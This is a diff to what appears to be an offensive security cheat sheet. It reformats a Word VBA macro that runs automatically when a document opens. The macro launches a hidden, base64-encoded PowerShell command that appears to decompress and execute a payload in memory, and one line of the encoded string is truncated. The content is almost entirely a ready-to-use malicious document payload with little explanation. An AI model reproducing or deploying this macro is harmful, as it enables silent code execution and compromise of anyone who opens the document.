@@ -151,16 +151,21 @@ End Sub
 #### Macro with shell code
 
 ```
-Sub AutoOpen() MyMacro
+Sub AutoOpen() 
+    MyMacro
 End Sub
-Sub Document_Open() MyMacro
+
+Sub Document_Open() 
+    MyMacro
 End Sub
+
 Sub MyMacro()
 Dim Str As String
 Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
 Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB" Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A" Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg" Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY" Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB" ...
 Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac" Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB" Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA" Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA" Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK" Str = Str + "QA="
-CreateObject("Wscript.Shell").Run Str End Sub
+CreateObject("Wscript.Shell").Run Str 
+End Sub
 ```
 ### MS Document Abuse
 
